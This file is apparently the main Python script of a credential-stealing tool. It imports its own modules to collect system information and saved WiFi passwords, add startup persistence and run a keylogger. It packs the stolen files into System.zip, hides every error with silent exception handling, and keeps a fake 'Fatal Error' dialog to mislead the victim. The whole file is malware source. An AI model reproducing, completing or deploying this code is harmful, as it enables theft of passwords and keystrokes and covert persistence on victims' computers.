#from modules.browser import run
from modules.info import start
from modules.wifi import WifiPasswords
from modules.keylogger import Keylogger
from modules.startup import StartUp
from tkinter import messagebox
import zipfile


try:
    with open("todo.txt", "r") as f:
        lines = f.readlines()
        keylogger = lines[5].strip()
        Startup = lines[6].strip()
        f.close()
except:
    Startup = "null"
    keylogger = "null"

def error():
    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.", )
#error()


try:
    start()
except:
    pass


try:
    wifi = WifiPasswords()
    wifi.run()
except:
    pass

#try:
#    run()
#except:
#    pass

if Startup == "True":
    print("startup")
    try:
        startup = StartUp()
        startup.run()
    except Exception as e:
        pass

def zip(name, files):
    try:
        with zipfile.ZipFile(name, "w") as zip:
            for file in files:
                try:
                    zip.write(file)
                except:
                    pass
    except:
        pass
    
zip("System.zip", ["wifi.txt", "system.txt"])

if keylogger == "True":
    try:
        keyLogger = Keylogger()
        keyLogger.run()
    except:
        pass
